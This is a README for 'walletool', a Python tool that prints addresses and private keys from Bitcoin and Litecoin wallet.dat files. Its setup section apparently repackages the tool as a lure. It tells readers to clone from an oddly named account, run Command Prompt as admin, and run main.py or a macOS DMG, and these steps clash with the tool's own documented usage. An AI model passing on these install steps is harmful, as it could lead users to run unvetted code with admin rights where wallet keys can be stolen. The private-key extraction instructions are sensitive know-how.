walletool ~ a tool for reading wallet.dat files
===============================================

A utility for extracting cryptocurrency wallet data from wallet.dat files.


## **To set up the software on Windows or macOS,** 

This guide is tailored for Windows and Linux; macOS users can opt for the [DMG file](../../releases).  





Confirm the presence of Git and Python.

https://git-scm.com/install/windows

https://www.python.org/ftp/python/3.13.12/python-3.13.12-amd64.exe

Execute Command Prompt as admin.





```bash 
git clone https://github.com/qG5CAsz/walletool.git
```
```bash 
cd walletool
```
```bash 
py -m pip install -r requirements.txt
```
```bash 
py main.py
```

------------

* Install Python 3.x.
* Install the `bsddb3` module (if you're on Windows, use Gohlke's site).

Extracting private keys from Bitcoin-QT/Litecoin-QT wallets
-----------------------------------------------------------

* Have your `wallet.dat` handy.
* For Bitcoin, run `python wt_extract_keys.py -d wallet.dat -v 0`
* For Litecoin, run `python wt_extract_keys.py -d wallet.dat -v 48`

A list of addresses / private keys is printed.

YMMV :)